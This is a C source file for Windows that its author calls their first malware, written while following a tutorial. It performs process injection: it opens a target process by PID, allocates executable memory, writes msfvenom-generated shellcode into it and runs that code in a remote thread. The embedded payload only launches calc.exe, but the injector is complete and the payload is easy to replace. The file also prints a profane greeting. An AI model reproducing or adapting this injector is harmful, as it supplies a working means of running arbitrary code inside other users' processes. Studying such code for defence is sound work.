#include <Windows.h>
#include <stdio.h>


/*
 * 11/24/2024 
 * This is the first malware I ever wrote. I was following https://www.youtube.com/watch?v=A6EKDAKBXPs 
 * This malware is utilizing a technique called process injection. This is when we inject shellcode into an already running process, which will 
 * execute the shellcode with respect to the current Security Context of the process (same token)
 * Approach
 *	1. open a handle to a process PID
 *	2. allocate memory in the process 
 *	3. write shellcode into the allocated memeory
 *	4. create a thread to run the shellcode 
 *	5. profit. 

 */


const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

LPVOID rBuffer = NULL; // This is the buffer within the target PID that we will write our shellcode into
DWORD PID = NULL;
HANDLE hProcess, hThread = NULL;

/* This is shell code generated from msfvenom.This will open calc.exe
 * Entire command: msfvenom --platform windows --arch x64 EXITFUNC=thread -p windows/x64/exec CMD="calc.exe" -f c --var-name=shellcode
 */
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


int main(int argc, char* argv[]) {
	printf("hello cunt\n");

	//Check args 
	if (argc < 2) {
		printf("%s Usage: malware.exe <PID>", e);
		return EXIT_FAILURE;
	}

	//  Convert PID from string to int
	PID = atoi(argv[1]);
	printf("%s Trying to open a handle to process (%ld)\n", i, PID);

	/* open a handle to a process
	 * you can think of a handle as a linux file descriptor, but for all sorts of resources, like files, 
	 * threads, processes, and other objects
	 */
	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS, 
		FALSE, 
		PID);

	if (!hProcess) {
		printf("%s Could not get a handle on the process (%ld), error: %ld\n", e, PID, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Got a handle to the process!\n\\---0x%p\n", e, hProcess);

	/* Allocate virtual memeory in the process, does not write the bytes into memory */
	rBuffer = VirtualAllocEx(
		hProcess,
		NULL,
		sizeof(shellcode),
		(MEM_RESERVE | MEM_COMMIT),
		PAGE_EXECUTE_READWRITE);

	if (!rBuffer) {
		printf("%s Could not allocate memory into the process (%ld), error: %ld\n", e, PID, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Allocated %zu-bytes with RWX permissions!\n", k, sizeof(shellcode));

	/* Write the shellcode to the memory region we allocated earlier */
	WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
	printf("%s Wrote %zu-bytes to process memory\n", k, sizeof(shellcode));

	/* Create a thread to run the shellcode we wrote in the allocated region of memeory */
	hThread = CreateRemoteThreadEx(
		hProcess, 
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		0,
		NULL
	);
		
	if (!hThread) {
		printf("%s Failed to get a handle to the thread, error: %ld\n", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s Waiting for the thread to finish...\n", i);

	/* This will wait for the tread to finish exeuting */
	WaitForSingleObject(hThread, INFINITE);  
	
	printf("%s Thread done executing!!!\n", k);


	printf("%s Cleaning up\n", i);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s Finished clearning up\n", i);

	return EXIT_SUCCESS;	
}